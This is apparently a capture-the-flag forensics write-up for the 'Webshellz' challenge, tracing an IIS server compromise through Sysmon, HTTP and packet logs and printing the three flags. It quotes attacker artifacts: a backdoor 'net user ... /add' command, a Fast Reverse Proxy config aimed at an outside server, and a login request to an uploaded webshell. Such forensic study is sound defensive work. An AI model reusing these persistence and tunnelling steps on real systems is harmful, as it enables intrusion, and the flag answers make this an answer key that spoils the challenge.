@@ -1,0 +1,88 @@
+Challenge: Webshellz
+Category: Forensics
+Author: Ben Folland
+
+Description:
+
+The sysadmin reported that some unexpected files were being uploaded to the file system of their IIS servers.
+
+As a security analyst, you have been tasked with reviewing the Sysmon, HTTP, and network traffic logs to help us identify the flags!
+
+NOTE
+
+The password to the ZIP archive is webshellz
+
+webshellz.zip 7.42 MB
+
+Flag #1: Something funky is going on with a new account that was created. Can you find the flag? This flag ends with a 6.
+Flag #2: There seems to be some Funky Random Program! This flag ends with a d.
+Flag #3: How did the threat actor attempt to gain access to the webshell? This flag ends with a e.
+
+Flag #1 Solve:
+
+1. For Flag #1, I used chainsaw to dump suspect events
+
+┌──(ctf㉿kali)-[~/Downloads/webshells/chainsaw]
+└─$ chainsaw hunt ../Sysmon.evtx -s ../sigma --mapping mappings/sigma-event-logs-all.yml
+
+	a. ParentCommandLine: net user IIS_USER VJGSuERc6qYAYPdRc556JTHqxqWwLbPwzABc0XgIhgwYEWdQji1 /add
+	b. Decoding the password for IIS_USER with Binary Refinery we get our first flag
+
+		┌──(ctf㉿kali)-[~/Downloads/webshells/chainsaw]
+		└─$ emit "VJGSuERc6qYAYPdRc556JTHqxqWwLbPwzABc0XgIhgwYEWdQji1" | b62   
+		(17:08:49) warning in b62: very long alphabet, unable to use built-ins; reverting to (slow) fallback.
+		flag{03638631595684f0c8c461c24b0879e6}
+
+Flag #1: flag{03638631595684f0c8c461c24b0879e6}
+
+Flag #2 Solve:
+
+1. Digging into the [Traffic.pcapng] file, we are looking for some sort of "Funky Random Program"
+
+	a. In the chainsaw scan we found: C:\ProgramData\frpc.exe -c fprc.ini (PUA - Fast Reverse Proxy)
+	b. In packet #19370 we find the following
+
+		C:\ProgramDAta\
+		-----------------------------25171422002747893140873671254
+		Content-Disposition: form-data; name="Bin_Lable_File"; filename="frpc.ini"
+		Content-Type: application/octet-stream
+
+		[common]
+		server_addr = 117.72.105.10
+		server_port = 7000 # MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===
+
+	c. Decoding the commented Base32 with Binary Refiner we get our second flag
+
+		┌──(ctf㉿kali)-[~/Downloads/webshells/chainsaw]
+		└─$ emit "MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===" | b32
+		flag{c7ba76c0a4484fe8c135a1195e8d94ed}
+
+Flag #2: flag{c7ba76c0a4484fe8c135a1195e8d94ed}
+
+Flag #3 Solve:
+
+1. Continuing to dig through [Traffic.pcapng] we find some base64 around a login for a websehll (revshell.aspx)
+
+	POST /uploads/revshell.aspx HTTP/1.1
+	Host: 18.175.56.171:41346
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 554
+	Origin: http://18.175.56.171:41346
+	Connection: keep-alive
+	Referer: http://18.175.56.171:41346/uploads/revshell.aspx
+	Upgrade-Insecure-Requests: 1
+	Priority: u=0, i
+
+	__EVENTTARGET=&__FILE=&__VIEWSTATE=%2FwEPDwUKMTg1NzY0NjY1MA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICBA9kFgICAw8WAh4HVmlzaWJsZWgWBgIJD2QWAgIDDxBkZBYBZmQCHQ9kFgQCAg8QZGQWAWZkAgUPZBYCAgMPZBYEAgEPEGRkFgBkAgMPEGRkFgFmZAIhD2QWAgILDxBkZBYBZmRkiHWp84MkXqQMgVs3p3Lcf6EgMVB9%2F9od3kKUDYLmiG8%3D&__VIEWSTATEGENERATOR=590BBAB6&__EVENTVALIDATION=%2FwEdAAO0%2FcoqrnxNs%2B2X0cBnXnyoxqtQhjhXkl7GpTTS3QEoG8IfTMgLVpbR6SeGROGuCp%2FkVaTxwWAU9BfU8kycel9gl04H22Z1wzt2CsWZOTX42A%3D%3D&Bin_TextBox_Login=ZmxhZ3tmYjRlMDc4YTczOWFjNGNlNjg3ZWI3OGMyZTUxYWFmZX0%3D&Bin_Button_Login=Login
+
+	a. Decoding with Binary Refinery we get our third and final flag
+
+		┌──(ctf㉿kali)-[~/Downloads/webshells]
+		└─$ emit "ZmxhZ3tmYjRlMDc4YTczOWFjNGNlNjg3ZWI3OGMyZTUxYWFmZX0" | b64             
+		flag{fb4e078a739ac4ce687eb78c2e51aafe}
+
+Flag #3: flag{fb4e078a739ac4ce687eb78c2e51aafe}
